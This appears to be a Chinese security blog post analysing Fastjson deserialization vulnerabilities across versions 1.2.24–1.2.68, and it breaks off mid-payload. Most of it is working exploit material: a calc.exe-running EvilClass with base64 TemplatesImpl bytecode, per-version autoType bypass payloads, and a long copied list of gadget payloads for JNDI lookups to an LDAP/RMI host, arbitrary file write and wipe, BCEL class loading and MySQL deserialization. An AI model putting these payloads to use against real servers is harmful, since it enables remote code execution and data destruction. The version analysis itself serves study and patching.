&#123; public EvilClass() throws IOException &#123; Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException&#123; &#125; public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123; &#125; public static void main(String[] args) throws Exception&#123; EvilClass evilClass = new EvilClass(); &#125;&#125; base64编码后json.prase解析 1234567891011121314151617181920212223242526272829303132333435package com.example.fastjson;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.io.Serializable;import java.util.Base64;public class test implements Serializable &#123; public static void main(String[] args)&#123; byte[] bytes = null; String path = &quot;E:\\\\java_file\\\\JNDI\\\\Fastjson\\\\src\\\\main\\\\java\\\\com\\\\example\\\\fastjson\\\\EvilClass.class&quot;; try&#123; FileInputStream fis = new FileInputStream(path); ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int n; while ((n = fis.read(b))!=-1)&#123; bos.write(b,0,n); &#125; fis.close(); bos.close(); bytes = bos.toByteArray(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; String bytecode = Base64.getEncoder().encodeToString(bytes); String payload = String.format(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;, \\&quot;_bytecodes\\&quot;:[\\&quot;%s\\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;, \\&quot;_name\\&quot;:\\&quot;a\\&quot;, \\&quot;_version\\&quot;:\\&quot;1.0\\&quot;, \\&quot;allowedProtocols\\&quot;:\\&quot;all\\&quot;&#125;&quot;,bytecode); System.out.println(payload); JSON.parseObject(payload, Feature.SupportNonPublicField); &#125;&#125; payload： 1&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEAHmNvbS9leGFtcGxlL2Zhc3Rqc29uL0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFwAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGgAIABsADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;&#125; 1.2.25-1.2.41修复了之前版本的漏洞，但是采取黑名单的方式来修改的，存在绕过方式 运行之前1.2.24的paylaod报错： autoType is not support，来看看这个checkAutoType干了什么： 检测autoTypeSupport 黑名单denyList检测 1this.denyList = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;); 指定类格式检测：L&amp;; 最后如果autoTypeSupport开启的情况下,进入loadclass.对@type指定类的格式进行了检测。这也很好绕过，添加L&amp;; 最终paylaod： 1&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://127.0.0.1:1099/ckb7j7\\&quot;,\\&quot;autoCommit\\&quot;:true&#125; 1&#123;&quot;@type&quot;:&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;, &quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEAHmNvbS9leGFtcGxlL2Zhc3Rqc29uL0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFwAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGgAIABsADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;&#125; 问：测试的时候我们是手动改的AutoTypeSupport = true,实际情况中默认为flase怎么打呢 1ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 1.2.42把1.2.25的paylaod运行下，报错，依旧是checkAutoType的原因： checkautotype中,添加了一串看不懂的，debug看看变化了什么 我们传入的Lcom.sun.rowset.JdbcRowSetImpl;被转换成了com.sun.rowset.JdbcRowSetImpl。这段代码这作用是使用hashcode对字符串进行了L&amp;;包裹的内容截取 过了这两个才能进入loadClass,loadClass和之前版本一样。所以我们要使得我们传入loadclass的是L&amp;;包裹的。由此绕过方式就直接在1.2.25的基础上，再套一次L&amp;;。这就能够绕过，最后调用 TypeUtils.loadClass 12Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0//Arrays.binarySearch()方法是Java中的一个工具方法，它用于在一个已经排序好的数组中搜索指定的元素，存在返回返回搜索元素的索引位置，不存在返回一个负数 对上面hash的解释 - from su18 1.2.43跑一遍1.2.42的paylaod,报错，又在checkAutoType这里抛出了异常 这个表达式对对类名进行了检测，如果连续出现两个LL就会抛出异常 但是在loadclass里存在递归调用loadclass.针对 [ 进行了处理和递归，因此可以利用[来绕过 payload: 12345&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/6y0pej&quot;,&quot;autoCommit&quot;:true&#125; 这里可以变动一下：[,,,,&#123;[,&#123; 1.2.44 - 结束字符串处理导致的黑名单绕过跑一遍1.2.423的paylaod,报错，又双在checkAutoType这里抛出了异常 他检测了我们传入的类，当第一个字符为[时抛出异常。 1注：对过滤的理解:定义了特征值,用于被检测的字符串转成ascii码后进行了运算后比较，实际上就是过滤 [ ,这里这么写可能是用来混淆，前面的过滤也是一样的 由字符串处理导致的黑名单绕过也就告一段落了，但我感觉这修复得还是很草率（虽然我不知到能怎么绕）前几个版本都是哪出问题禁哪里，感觉修复的比较水（莫非开发大佬故意的，给搞安全的留口饭吃（狗头保命）） 1.2.45这个漏洞是因为存在其他组件利用导致的，需要导入mybatis的jar包。适用于&lt;=1.2.45 黑名单中不存在org.apache.ibatis.datasource.jndi.JndiDataSourceFactory，可以直接利用 12345678910 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.45&lt;/version&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt;&lt;/dependency&gt; JndiDataSourceFactory中的setProperties方法存在lookup方法。满足set以及lookup这俩个条件，可以利用 JndiDataSourceFactory类利用测试demo： 1234567891011121314import org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;import java.util.Properties;public class test &#123; public static void main(String[] args) throws Exception&#123; JndiDataSourceFactory jndiDataSourceFactory = new JndiDataSourceFactory(); Properties properties = new Properties(); properties.setProperty(&quot;data_source&quot;,&quot;ldap://127.0.0.1:1389/6y0pej&quot;); jndiDataSourceFactory.setProperties(properties); &#125;&#125; 12//payload&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://127.0.0.1:1389/6y0pej&quot;&#125;&#125; 这个组件的存在导致了漏洞。那么要是又爆出了可利用的组件是不是又g了。过来了这么久应该有其他可利用组件吧（虽然我不知道） 1.2.47影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport影响版本：1.2.33 &lt;= fastjson &lt;= 1.2.47 这个版本漏洞最为严重，1.2.25-1.2.45都是需要autoTypeSupport=true的，而他可以在不开启autoTypeSupport的情况下触发漏洞。 问题依旧出在checkAutoType： autoTypeSupport=true的时候会和1.2.44一样被检测抛出异常 如果能够继续往下走到这的话，会从Mapping和deserializers中寻找类，如果存在则返回clazz 在ParserConfig类中，构造方法中调用了initDeserializers 12345ParserConfig(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader, boolean fieldBased)&#123; &#x27;&#x27;&#x27;&#x27; this.initDeserializers(); &#x27;&#x27;&#x27;&#x27;&#125; 而initDeserializers会向deserializers中添加很多类，类似一种缓存。其中的 this.deserializers.put(Class.class, MiscCodec.instance);是可以利用的 在MiscCodec类中存在一个deserialze方法，这个方法中对传入的clazz进行了判断，如果是Class.class，那么就会调用TypeUtils.loadClass。这里就接到fastjson后半部分了。 在TypeUtils.loadClass中，如果cache为true则会将className放到mapping中，其中cache默认为true，className为传进来的strVal strVal是由objVal强制转换来的，而objVal = parser.parse();，就是指定的com.sun.rowset.JdbcRowSetImpl对象， 而deserialze中检测了参数名称，必须为val 所以需要在payload中添加上val参数 paylaod： 1234//payload:&quot;&#123;\\&quot;k4\\&quot;: &#123;\\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;, \\&quot;val\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;, \\&quot;k3\\&quot;: &#123;\\&quot;@type\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;, \\&quot;dataSourceName\\&quot;: \\&quot;ldap://127.0.0.1:1389/6y0pej\\&quot;,\\&quot;autoCommit\\&quot;: true&#125;\\&quot;&#125;&quot; //k4和k2这两个是可以随意修改的 问题： 1，怎么调用了ParserConfig类，从而存在后面的链子的？ parse中实例化了这个类 2，怎么调用到MiscCodec.deserialze()的？ DefaultJSONParser.parseObject() 根据不同的 class 类型分配 deserialzer，Class 类型由 MiscCodec.deserialze() 处理 ​ 1.2.47可参考su18✌的文章，分析得很清楚！https://su18.org/post/fastjson/#7-fastjson-1247 1.2.68在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 MiscCodec 处理 Class 类的地方，设置了cache 为 false ，并且 loadClass 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。—— form su18 在1.2.68中跟新了一个安全控制点safeMode，在com\\alibaba\\fastjson\\1.2.68\\fastjson-1.2.68.jar!\\com\\alibaba\\fastjson\\parser\\Feature.class checkAutoType中检测了safeMode，如果为ture，直接抛出异常 但是概版本也爆出了一个新的autoType开关绕过方式：expectClass 绕过 checkAutoType() 在 checkAutoType() 函数中有这样的逻辑：当expectClass参数不为Null、且当前需要实例化的类型是expectClass的子类或实现时会将传入的类视为一个合法的类（此类不能在黑名单中），就可以通过 checkAutoType() 的安全检测。 期望类expcetClass 1234567891011121314151617final boolean expectClassFlag;if (expectClass == null) &#123; expectClassFlag = false;&#125; else &#123; if (expectClass == Object.class || expectClass == Serializable.class || expectClass == Cloneable.class || expectClass == Closeable.class || expectClass == EventListener.class || expectClass == Iterable.class || expectClass == Collection.class ) &#123; expectClassFlag = false; &#125; else &#123; expectClassFlag = true; &#125;&#125; 其中Object,Serializable,Cloneable,Closeable,EventListener,Iterable,Collection这几个类不能作为期望类 所以我们只需要找到checkAutoType() 几个重载方法是否有可控的 expectClass: JavaBeanDeserializer#deserialze() 在fastjson中对大部分类都指定了特定的deserializer，而AutoCloseable类没有，通过继承/实现AutoCloseable的类可以绕过autotype反序列化 1&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;: &quot;com.example.fastjson.execCloseable&quot;,&quot;domain&quot;:&quot;calc&quot;&#125; ThrowableDeserializer#deserialze() deserialze() 方法直接将 @type后的类传入 checkAutoType() ，并且 expectClass 为 Throwable.class。通过 checkAutoType() 之后，将使用 createException 来创建异常类的实例，这就形成了 Throwable 子类绕过 checkAutoType() 的方式 1234567891011121314151617181920212223//测试demoimport java.io.IOException;public class execException extends Exception &#123; private String cmd; public execException() &#123; super(); &#125; public String getCmd() &#123; return cmd; &#125; public void setCmd(String cmd) &#123; this.cmd = cmd; &#125; @Override public String getMessage() &#123; try &#123; Runtime.getRuntime().exec(new String[]&#123;cmd&#125;); &#125; catch (IOException e) &#123; return e.getMessage(); &#125; return super.getMessage(); &#125;&#125; 但是这个很鸡肋，命令执行是写在异常类处理中的，实际中少有开发者会这么写 1&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;: &quot;com.example.fastjson.execException&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125; 问题：添加expectClass的原因？ 存在的原因应当是例如 com.cyx.A 为白名单， com.cyx.A 的构造方法中或setter中存在 com.cyx.B，那么要想实例化 com.cyx.A 则需要传入 com.cyx.B 对象，而 com.cyx.B 并不在白名单中，所以将其作为expectClass参数传入checkAutoType方法中检测该类是否合法，如果是 com.cyx.B 的子类或实现则视为合法的类。 payload这些payload都是从su18师傅博客中搬过来的，还没有挨个测试过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399JdbcRowSetImpl&#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true&#125;TemplatesImpl&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;], &#x27;_name&#x27;: &#x27;su18&#x27;, &#x27;_tfactory&#x27;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125;JndiDataSourceFactory&#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;: &#123; &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125;SimpleJndiBeanFactory&#123; &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;, &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;propertyPath&quot;: &quot;su18&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;&#125;DefaultBeanFactoryPointcutAdvisor&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;, &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;,&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;&#125;WrapperConnectionPoolDataSource&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot; &#125;JndiRefForwardingDataSource&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;loginTimeout&quot;: 0 &#125;InetAddress&#123; &quot;@type&quot;: &quot;java.net.InetAddress&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125;Inet6Address&#123; &quot;@type&quot;: &quot;java.net.Inet6Address&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125;URL&#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125;JSONObject&#123; &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;, &#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot; &#125;&#125;&quot;&quot;&#125;URLReader&#123; &quot;poc&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;, &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;, &quot;url&quot;: &quot;http://127.0.0.1:9999&quot; &#125; &#125;&#125;AutoCloseable 任意文件写入&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/path/to/target&quot; &#125;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;, &quot;filename&quot;: &quot;filecontent&quot; &#125;&#125;BasicDataSource&#123; &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;, &quot;driverClassLoader&quot; : &#123; &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot; &#125;&#125;JndiConverter&#123; &quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;JtaTransactionConfig&#123; &quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, &quot;properties&quot;: &#123; &quot;@type&quot;: &quot;java.util.Properties&quot;, &quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125;JndiObjectFactory&#123; &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;AnterosDBCPConfig&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;AnterosDBCPConfig2&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;CacheJndiTmLookup&#123; &quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;AutoCloseable 清空指定文件&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125;AutoCloseable 清空指定文件&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileWriter&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125;AutoCloseable 任意文件写入&#123; &quot;stream&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;, &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;, &quot;sink&quot;: &#123; &quot;$ref&quot;:&quot;$.stream&quot; &#125;, &quot;start&quot;:38 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;:&quot;$.writer&quot; &#125; &#125;&#125;AutoCloseable MarshalOutputStream 任意文件写入&#123; &#x27;@type&#x27;: &quot;java.lang.AutoCloseable&quot;, &#x27;@type&#x27;: &#x27;sun.rmi.server.MarshalOutputStream&#x27;, &#x27;out&#x27;: &#123; &#x27;@type&#x27;: &#x27;java.util.zip.InflaterOutputStream&#x27;, &#x27;out&#x27;: &#123; &#x27;@type&#x27;: &#x27;java.io.FileOutputStream&#x27;, &#x27;file&#x27;: &#x27;dst&#x27;, &#x27;append&#x27;: false &#125;, &#x27;infl&#x27;: &#123; &#x27;input&#x27;: &#123; &#x27;array&#x27;: &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;, &#x27;limit&#x27;: 22 &#125; &#125;, &#x27;bufLen&#x27;: 1048576 &#125;, &#x27;protocolVersion&#x27;: 1&#125;BasicDataSource&#123; &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;, &quot;driverClassName&quot;: &quot;true&quot;, &quot;driverClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot; &#125;HikariConfig&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;HikariConfig&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;HikariConfig&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;HikariConfig&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;SessionBeanProvider&#123; &quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;Object&quot;: &quot;su18&quot;&#125;JMSContentInterceptor&#123; &quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;java.util.Hashtable&quot;, &quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;, &quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;, &quot;namespace&quot;: &quot;&quot;&#125;ContextClassLoaderSwitcher&#123; &quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;, &quot;contextClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;a&quot;: &#123; &quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot; &#125;&#125;OracleManagedConnectionFactory&#123; &quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;, &quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;JNDIConfiguration&#123; &quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;JDBC4Connection&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;172.20.64.40&quot;, &quot;portToConnectTo&quot;: 3306, &quot;url&quot;: &quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;databaseToConnectTo&quot;: &quot;test&quot;, &quot;info&quot;: &#123; &quot;@type&quot;: &quot;java.util.Properties&quot;, &quot;PORT&quot;: &quot;3306&quot;, 